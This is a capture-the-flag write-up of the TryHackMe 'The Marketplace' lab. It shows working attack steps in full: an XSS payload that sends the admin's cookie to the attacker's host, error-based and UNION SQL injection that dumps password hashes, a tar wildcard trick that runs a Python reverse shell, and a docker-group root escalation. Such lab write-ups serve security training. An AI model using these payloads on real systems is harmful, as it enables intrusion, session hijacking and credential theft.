# The Marketplace

## Introduction:

Welcome to my another writeup! In this TryHackMe [The Marketplace](https://tryhackme.com/room/marketplace) room, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Can you take over The Marketplace's infrastructure?

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

> Difficulty: Medium

- Overall difficulty for me: Medium
    - Initial foothold: Medium
    - Privilege Escalation: Easy

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root💀siunam)-[~/ctf/thm/ctf/The_Marketplace]
└─# export RHOSTS=10.10.215.231 
                                                                                                                         
┌──(root💀siunam)-[~/ctf/thm/ctf/The_Marketplace]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 -a $RHOSTS -- -sC -sV -Pn -oN rustscan/rustscan.txt       
[...]
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLj5F//uf40JILlSfWp95GsOiuwSGSKLgbFmUQOACKAdzVcGOteVr3lFn7vBsp6xWM5iss8APYi9WqKpPQxQLr2jNBybW6qrNfpUMVH2lLcUHkiHkFBpEoTP9m/6P9bUDCe39aEhllZOCUgEtmLpdKl7OA3tVjhthrNHNPW+LVfkwlBgxGqnRWxlY6XtlsYEKfS1B+wODrcVwUxOHthDps/JMDUvkQUfgf/jpy99+twbOI1OZbCYGJFtV6dZoRqsp1Y4BpM3VjSrrvV0IzYThRdssrSUgOnYrVOZl8MrjMFAxOaFbTF2bYGAS/T68/JxVxktbpGN/1iOrq3LRhxbF1
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHyTgq5FoUG3grC5KNPAuPWDfDbnaq1XPRc8j5/VkmZVpcGuZaAjJibb9RVHDlbiAfVxO2KYoOUHrpIRzKhjHEE=
|   256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2ol/CJc6HIWgvu6KQ7lZ6WWgNsTk29bPKgkhCvG2Ar
80/tcp    open  http    syn-ack ttl 62 nginx 1.19.2
|_http-title: The Marketplace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
32768/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 3 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 7.6p1 Ubuntu
80                | nginx 1.19.2
32768             | Node.js (Express middleware)

## HTTP on Port 80

Always enumerate HTTP first, as it has the largest attack vectors.

In the `index` page, we can see there are 2 users: `michael` and `jake`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a1.png)

And we also see that there is a login page! Let's test SQL Injection to bypass authentication!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a2.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a3.png)

Nope. Looks like it's not vulnerable to SQL Injection.

Then why don't we register a new user? Maybe there is a vulnerablility waiting for us!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a4.png)

Let's login into the newly created account!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a5.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a6.png)

We can see that there are 2 things that's worth to investigate: `New listing` and `Messages`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a7.png)

Hmm... File upload's temporarily disabled, so we can't upload a PHP reverse shell.

Let's test the "Submit Query".

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a8.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a9.png)

A new item is created!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a10.png)

Let's test **Cross-site Script(XSS)**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a11.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a12.png)

Looks like the "Title" is not vulnerable to XSS.

BUT!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a13.png)

The "Description" is vulnerable to XSS! Also, if you see it carefully, there is a link to "Contact the listing author". Let's check that out!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a14.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a15.png)

It seems like we can send a message to the item's author! Let's test XSS again!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a16.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a17.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a18.png)

Nope, it's not vulnerable to XSS.

Hmm... What if we can capture a user's cookie? So we can login as that user?

I also notice that we can report a listing to **admin**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a19.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a20.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a21.png)

Hmm... What if we can leverage the XSS vunlerability to capture admin's "token" cookie?? This would allow us to login as admin!

**To achieve this, I'll:**

1. host a website via python's `http.server` module:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a22.png)

2. Craft a XSS payload:

**XSS payload:**
```html
<script>document.write('<img src="http://YOUR_VPN_IP_ADDRESS/?'+document.cookie+' "/>')</script>
```

This will create an image in the listing, and capture an user's cookies.

3. Create a new listing with the XSS payload in above:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a23.png)

After created, you should see your cookies:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a24.png)

4. Click "Report listing to admins":

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a25.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a26.png)

5. Captured admin's cookies!:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a27.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a28.png)

```
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NjE4NTAxMDJ9.CghyCdJOW-5TqjD2vkqPMZzuxOE5CQnS0dSvnLvQPxQ
```

6. Change your token value to admin's value:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a29.png)

7. Hard refresh(Ctrl+r) your browser:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a30.png)

Boom!! We're admin!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a31.png)

**flag 1:**
```
THM{Redacted}
```

# Initial Foothold

After I enumerate the "Administration panel" a little bit, I found that **it suffers SQL Injection**!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a32.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a33.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a34.png)

Found an **Error-Based SQL Injection** vulnerability! I'll use [this cheat sheet](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/) to do it.

**Let's retrieve it's MySQL version:**
```sql
1 AND extractvalue(rand(),concat(0x3a,version()))--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a35.png)

- MySQL version:8.0.21

**Retrieve database names:**
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 1,1)))--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a36.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a37.png)

- Databases: `information_schema`, `marketplace`.

Since `information_schema` is a default database in MySQL, I'll enumerate the `marketplace` database:

**Retrieve database `marketplace`'s table names:**
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="marketplace" LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="marketplace" LIMIT 1,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="marketplace" LIMIT 2,1)))--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a38.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a39.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a40.png)

- Database `marketplace`'s table names: `items`, `messages`, `users`.

**Retrieve database `marketplace`'s column names:**
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="items" LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="items" LIMIT 1,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="items" LIMIT 2,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="items" LIMIT 3,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="items" LIMIT 4,1)))--

1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="messages" LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="messages" LIMIT 1,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="messages" LIMIT 2,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="messages" LIMIT 3,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="messages" LIMIT 4,1)))--

1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 1,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 2,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME="users" LIMIT 3,1)))--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a41.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a42.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a43.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a44.png)

- Database `marketplace`'s column names: 
	- Table `items`: `id`, `author`, `title`, `description`, `image`.
	- Table `messages`: `id`, `user_from`, `user_to`, `message_content`, `is_read`, 
	- Table `users`: `id`, `username`, `password`, `isAdministrator`, 

**Retrieve database `marketplace`'s data in all tables:**
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,username,0x3a,password,0x3a,isAdministrator) FROM users LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,username,0x3a,password,0x3a,isAdministrator) FROM users LIMIT 1,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,username,0x3a,password,0x3a,isAdministrator) FROM users LIMIT 2,1)))--

1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,user_from,0x3a,user_to,0x3a,message_content,0x3a,is_read) FROM messages LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,user_from,0x3a,user_to,0x3a,message_content,0x3a,is_read) FROM messages LIMIT 1,1)))--

1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,author,0x3a,title,0x3a,description,0x3a,image) FROM items LIMIT 0,1)))--
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(id,0x3a,author,0x3a,title,0x3a,description,0x3a,image) FROM items LIMIT 1,1)))--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a45.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a46.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a47.png)

**Credentials from table `users`:**
```
system:$2b$10$83pRYaR/d4ZWJVE
michael:$2b$10$yaYKN53QQ6ZvPz
jake:$2b$10$/DkSlJB4L85SCNhS
```

**Data from table `messages`:**
```
1:1:3:Hello! An automated syst
2:1:4:Thank you for your report
```

**Data from table `items`:**
```
1:2:Dell Laptop:Good as new. :8
2:3:A cactus:Yep, that's a cact
```

However, did you notice something's wrong? Look at the data in table `messages`, it's not the full output.

To fix this, we have to change our payload.

I found that we can also use **UNION**.

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a48.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a49.png)

**Let's use UNION to retrieve all data from tables `users` and `messages` !**
```sql
0 UNION ALL SELECT concat(username,0x3a,password),NULL,NULL,NULL FROM users LIMIT 0,1--
0 UNION ALL SELECT concat(username,0x3a,password),NULL,NULL,NULL FROM users LIMIT 1,1--
0 UNION ALL SELECT concat(username,0x3a,password),NULL,NULL,NULL FROM users LIMIT 2,1--

0 UNION ALL SELECT concat(user_to,0x3a,message_content),NULL,NULL,NULL FROM messages LIMIT 0,1--
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a50.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a51.png)

**Full credentials:**
```
system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q
jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG
```

**Full data from table `messages`:**
```
3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_{Redacted}
```

Also, we know `id:3` is user `jake` from "Administration panel".

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a52.png)

Now, let's login to user `jake` via SSH!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a53.png)

We're finally in!

**user.txt:**
```
jake@the-marketplace:~$ cat /home/jake/user.txt 
THM{Redacted}
```

# Privilege Escalation

## jake to michael

**Sudo Permission:**
```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
```

**User `jake` is able to run `/opt/backups/backup.sh` as `michael`!** Let's check that out!

```
jake@the-marketplace:~$ ls -lah /opt/backups/backup.sh 
-rwxr-xr-x 1 michael michael 73 Aug 23  2020 /opt/backups/backup.sh

jake@the-marketplace:~$ cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

**The `tar` command is using a wildcard(`*`)**, which means we can escalate to `michael`!!

> Note: We can't exploit the relative path, as it has `secure_path` variable.

According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we can spawn a interactive shell via abusing the wildcard!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Marketplace/images/a54.png)

1. Create a python reverse shell:

```
jake@the-marketplace:/opt/backups$ cat << EOF > revshell.sh
> python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.18.61.134",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
> EOF

jake@the-marketplace:/opt/backups$ chmod +x revshell.sh
```

2. Create 2 files to trigger the reverse shell:

```
jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint=1"

jake@the-marketplace:/opt/backups$ echo "" > "--checkpoint-action=exec=sh revshell.sh"
```

3. Setup a `nc` listener and run the `sudo` command:

```
┌──(root💀siunam)-[~/ctf/thm/ctf/The_Marketplace]
└─# nc -lnvp 443
listening on [any] 443 ...

jake@the-marketplace:/opt/backups$ sudo -u michael /opt/backups/backup.sh

┌──(root💀siunam)-[~/ctf/thm/ctf/The_Marketplace]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.18.61.134] from (UNKNOWN) [10.10.102.127] 57820
michael@the-marketplace:/opt/backups$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
michael
the-marketplace
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:bf:a1:53:5e:5f brd ff:ff:ff:ff:ff:ff
    inet 10.10.102.127/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2251sec preferred_lft 2251sec
    inet6 fe80::bf:a1ff:fe53:5e5f/64 scope link 
       valid_lft forever preferred_lft forever
[...]
```

And we're `michael`!

## michael to root

In the above `id`'s output, we can see that michael is inside the `docker` group, which means we can escalate to root by spawning a insecure docker container!

```
michael@the-marketplace:/opt/backups$ docker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
themarketplace_marketplace   latest              6e3d8ac63c27        24 months ago       2.16GB
nginx                        latest              4bb46517cac3        2 years ago         133MB
node                         lts-buster          9c4cc2688584        2 years ago         886MB
mysql                        latest              0d64f46acfd1        2 years ago         544MB
alpine                       latest              a24bb4013296        2 years ago         5.57MB
```

To do so, I'll:

1. Spawn a `root` shell in one of those containers:

```
michael@the-marketplace:/opt/backups$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
[...]
root@82c36fdf20ef:/# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
82c36fdf20ef
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
[...]
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

We're root **inside the container.**

2. Copy `/bin/bash` to `/opt/backups`, and add SUID set bit to the copied `bash`:

```
root@82c36fdf20ef:/# cp /bin/bash /opt/backups/root_bash

root@82c36fdf20ef:/# chmod +s /opt/backups/root_bash

root@82c36fdf20ef:/# ls -lah /opt/backups/root_bash
-rwsr-sr-x 1 root root 1.1M Aug 30 11:26 /opt/backups/root_bash
```

3. Exit current container, and spawn a root shell via `-p` option in bash. This will spawn a SUID privilege bash:

```
root@82c36fdf20ef:/# exit

michael@the-marketplace:/opt/backups$ /opt/backups/root_bash -p

root_bash-4.4# whoami;hostname;id;ip a
root
the-marketplace
uid=1002(michael) gid=1002(michael) euid=0(root) egid=0(root) groups=0(root),999(docker),1002(michael)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:bf:a1:53:5e:5f brd ff:ff:ff:ff:ff:ff
    inet 10.10.102.127/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 1807sec preferred_lft 1807sec
    inet6 fe80::bf:a1ff:fe53:5e5f/64 scope link 
       valid_lft forever preferred_lft forever
[...]
```

We're root! :D

# Rooted

**root.txt:**
```
root_bash-4.4# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Stored Cross-Site Script(XSS)
2. Error-Based & Union-Based SQL Injection
3. Privilege Escalation via Abusing Wildcard in `tar`
4. Privilege Escalation via Spawning a Root Shell In a Docker Container